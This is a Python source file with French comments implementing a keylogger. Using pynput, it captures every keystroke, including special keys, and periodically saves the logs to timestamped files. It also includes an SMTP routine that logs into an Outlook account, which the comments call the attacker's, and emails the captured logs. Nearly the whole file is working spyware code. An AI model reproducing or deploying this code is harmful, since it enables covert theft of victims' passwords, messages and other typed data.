import pynput.keyboard #pour enregistrer les touches pressées
import threading  #pour exécuter des fonctions en parallèle
import smtplib #pour envoyer les logs par mail
import subprocess #pour exécuter des commandes shell
from email.message import EmailMessage 
import requests #pour télécharger des fichiers
from datetime import datetime
 
log=""  #variable globale pour stocker les logs 

class Keylogger: #classe pour le keylogger pour pouvoir l'instancier 
    #version fichier
    def __init__(self,interval): #constructeur de la classe
        self.log="" #variable pour stocker les logs
        self.interval=interval #intervalle de temps entre chaque envoi des logs
        #self.email=email #email de l'attaquant
        #self.password=password #mot de passe de l'attaquant
        self.report2() #appel de la fonction report pour envoyer les logs par mail
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename=f"keylog-{str(self.start_dt)[:-7].replace(' ', '-').replace(':', '')}_{str(self.end_dt)[:-7].replace(' ', '-').replace(':', '')}"
    


    def append_to_log(self,string): #fonction pour ajouter les touches pressées à la variable log
        self.log=self.log + string #concaténation de la variable log et de la touche pressée

    def process_key_press(self, key): #fonction pour traiter les touches pressées 
        
        try: #si la touche pressée est un caractère
            if key.char is not None and key.char.isdigit(): #si la touche pressée est un chiffre
                current_key = str(key.char) #on convertit le chiffre en string
            else: #si la touche pressée est un caractère
                current_key = str(key.char) if key.char is not None else "" #on convertit le caractère en string
    
        except AttributeError:  #si la touche pressée est une touche spéciale
            if key == key.space: 
                current_key=" "
            elif key == key.enter:
                current_key=" \n "
            elif key == key.num_lock:
                current_key=" <NUM LOCK> "
                    
            elif key == key.tab:
                current_key=" \t "
            elif key == key.backspace:
                current_key=" <BACKSPACE> "
            elif key == key.ctrl_l:
                current_key=" <CTRL> "
            elif key == key.shift:
                current_key=" <SHIFT> "
            elif key == key.alt_l:
                current_key=" <ALT> "
            elif key == key.caps_lock:
                current_key=" <CAPS LOCK> "
            elif key == key.cmd:
                current_key=" <COMMAND> "
            elif key==key.shift_r:
                current_key=" <SHIFT> " + " "
            
            
            else:
                current_key="" + str(key) + "" #on convertit la touche spéciale en string
            
        
        self.append_to_log(current_key) #on ajoute la touche pressée à la variable log

    
    
    #def report(self): #fonction pour envoyer les logs par mail 
        #self.send_mail(self.email, self.password, "\n\n" + self.log) #envoi logs par mail
        #self.log="" #réinitialisation de la variable log
        #timer=threading.Timer(self.interval, self.report) #création d'un timer pour exécuter la fonction report à intervalle régulier
        #timer.start()  #démarrage du timer

    def send_mail(self,email,password,message_content): #fonction pour envoyer les logs par mail
        server=smtplib.SMTP('smtp.outlook.com', 587) #connexion au serveur smtp d'outlook sur le port 587
        server.starttls() #transport layer security
        server.login(email,password)  #connexion au compte mail de l'attaquant
        
        message = EmailMessage() #création d'un objet message
        message.set_content(message_content, subtype='plain', charset='utf-8') #définition du contenu du message

        server.sendmail(email,email,message.as_string()) #envoi du mail
        server.quit() #fermeture de la connexion au serveur smtp

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        
        with open(f"{self.filename}.txt", "w") as f:
            
            print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")
        
        timer=threading.Timer(self.interval, self.report_to_file)
        timer.start()
                  
    def report2(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            
            self.report_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = threading.Timer(interval=self.interval, function=self.report2)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    #create a new file for each new session
    
    
    
    def start(self): #fonction pour démarrer le keylogger
        self.start_dt = datetime.now()
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press) #création d'un objet keyboard_listener qui va écouter les touches pressées

        with keyboard_listener: #on lance le keylogger
            self.report2() #on lance la fonction report
            keyboard_listener.join()  #on attend que le keylogger s'arrête